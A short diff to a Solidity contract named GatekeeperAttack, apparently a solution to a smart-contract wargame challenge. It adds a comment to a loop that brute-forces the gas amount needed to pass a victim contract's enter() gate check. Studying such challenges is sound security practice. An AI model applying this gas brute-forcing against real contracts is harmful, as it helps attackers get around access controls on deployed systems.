@@ -15,6 +15,7 @@ contract GatekeeperAttack {
 
     bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")), gateKeyPadded);
 
+    // brute force 
     for (uint256 i = 0; i < 120; i++) {
       (bool result, bytes memory data) = victim.call.gas(i + 150 + 8191 * 4)(encodedParams);
       if (result) {
